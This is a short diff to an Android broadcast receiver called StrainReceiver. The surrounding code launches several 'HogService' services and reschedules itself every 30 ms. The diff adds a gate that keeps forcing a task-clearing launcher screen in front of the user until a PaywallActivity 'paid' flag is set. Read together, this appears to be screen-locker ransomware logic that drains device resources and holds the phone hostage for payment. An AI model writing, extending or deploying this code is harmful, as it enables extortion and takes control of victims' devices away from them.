@@ -20,9 +20,11 @@ public class StrainReceiver extends BroadcastReceiver {
             HogService.start(ctx, HogService2.class);
             HogService.start(ctx, HogService3.class);
             scheduleRelaunch(ctx, 30);
-            Intent i = new Intent(ctx, MainActivity.class);
-            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
-            try { ctx.startActivity(i); } catch (Throwable ignored) {}
+            if (!PaywallActivity.paid) {
+                Intent i = new Intent(ctx, LauncherActivity.class);
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+                try { ctx.startActivity(i); } catch (Throwable ignored) {}
+            }
         }
     }
     public static void scheduleRelaunch(Context ctx, long ms) {
